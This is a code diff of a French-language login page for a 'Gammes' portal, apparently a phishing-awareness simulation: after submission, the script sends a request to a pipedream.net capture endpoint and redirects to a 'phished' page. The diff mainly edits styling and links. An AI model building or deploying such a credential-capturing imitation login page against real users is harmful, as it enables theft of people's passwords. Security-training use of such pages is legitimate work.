@@ -72,6 +72,15 @@
         display: flex;
         gap: 8px;
       }
+
+      #forgot-password {
+        display: block;
+        font-size: 14px;
+        margin-top: 10px;
+        text-align: center;
+        color: var(--gray);
+        text-decoration: underline;
+      }
     </style>
   </head>
 
@@ -89,7 +98,7 @@
             <label for="username" class="form-label">Identifiant</label>
             <input
               type="text"
-              placeholder="Aa"
+              placeholder="a.dupont@gammes.org"
               id="username"
               class="form-control"
               required
@@ -108,21 +117,41 @@
             <button type="button" class="btn btn-primary" id="submit">
               Connexion
             </button>
+            <br />
+            <a
+              id="forgot-password"
+              href="mailto:infosec@gammes.org?subject=[Nouveau portail] Mot de passe oublié"
+              target="_blank"
+              rel="noopener noreferrer"
+              >Mot de passe oublié</a
+            >
           </div>
         </div>
       </section>
     </main>
     <footer>
       <div>
-        © 2023 <a href="https://www.gammes.org/" target="_blank">Gammes</a> :
-        Tout faire pour ne laisser personne au bord du chemin
+        © 2023
+        <a
+          href="https://www.gammes.org/"
+          target="_blank"
+          rel="noopener noreferrer"
+          >Gammes</a
+        >
+        : Tout faire pour ne laisser personne au bord du chemin
       </div>
       <div class="links">
-        <a href="https://www.gammes.org/plan-du-site/" target="_blank"
+        <a
+          href="https://www.gammes.org/plan-du-site/"
+          target="_blank"
+          rel="noopener noreferrer"
           >Plan du site</a
         >
         <span>|</span>
-        <a href="https://www.gammes.org/mentions-legales/" target="_blank"
+        <a
+          href="https://www.gammes.org/mentions-legales/"
+          target="_blank"
+          rel="noopener noreferrer"
           >Mentions légales</a
         >
         <span>|</span>
@@ -130,12 +159,14 @@
           rel="privacy-policy"
           href="https://www.gammes.org/donnees-personnelles/"
           target="_blank"
+          rel="noopener noreferrer"
           >Données personnelles</a
         >
         <span>|</span>
         <a
           href="https://www.gammes.org/politique-de-cookies-eu/"
           target="_blank"
+          rel="noopener noreferrer"
           >Politique de cookies</a
         >
         <span>|</span>
@@ -143,6 +174,7 @@
           title="agence seo JV PROSPECTIVES"
           href="https://jvprospectives.com"
           target="_blank"
+          rel="noopener noreferrer"
           >Agence éditoriale</a
         >
       </div>
@@ -213,7 +245,7 @@
 
       fetch("https://eoiqxtr5za6pz92.m.pipedream.net", options);
 
-      window.location.pathname = "/phished.html";
+      window.location.pathname = "/login/phished.html";
     }
 
     submitEl.addEventListener("click", login);
